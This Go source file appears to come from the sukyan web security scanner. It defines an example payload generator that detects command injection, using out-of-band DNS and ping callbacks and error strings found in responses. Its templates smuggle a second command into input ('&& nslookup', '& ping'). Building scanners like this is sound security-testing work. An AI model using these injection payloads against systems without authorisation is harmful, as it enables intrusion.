package payloads

import (
	"github.com/pyneda/sukyan/pkg/payloads/generation"
)

// Example of how a generator could be used to generate payloads and detection methods.
// NOTE: Still need to decide if write them in go or load them from yaml files.

func getGenerator() generation.PayloadGenerator {
	generator := generation.PayloadGenerator{
		IssueCode:          "command_injection",
		DetectionCondition: generation.Or,
		DetectionMethods: []generation.DetectionMethod{
			{
				OOBInteraction: &generation.OOBInteractionDetectionMethod{
					OOBAddress: "{{.oob_address}}",
					Confidence: 100,
				},
			},
			{
				ResponseCondition: &generation.ResponseConditionDetectionMethod{
					Contains:   "command not found",
					Confidence: 70,
				},
			},
			{
				ResponseCondition: &generation.ResponseConditionDetectionMethod{
					Contains:   "invalid option",
					Confidence: 70,
				},
			},
			{
				ResponseCondition: &generation.ResponseConditionDetectionMethod{
					Contains:   "unknown option",
					Confidence: 70,
				},
			},
		},
		Vars: []generation.PayloadVariable{
			{
				Name:  "oob_address",
				Value: "{{generateInteractionUrl}}",
			},
			{
				Name:  "test",
				Value: "test",
			},
		},
		Templates: []string{
			"&& nslookup {{.oob_address}}",
			"& nslookup {{.oob_address}}",
			"& ping {{.oob_address}}",
		},
		Categories: []string{"command_injection"},
	}
	return generator
}
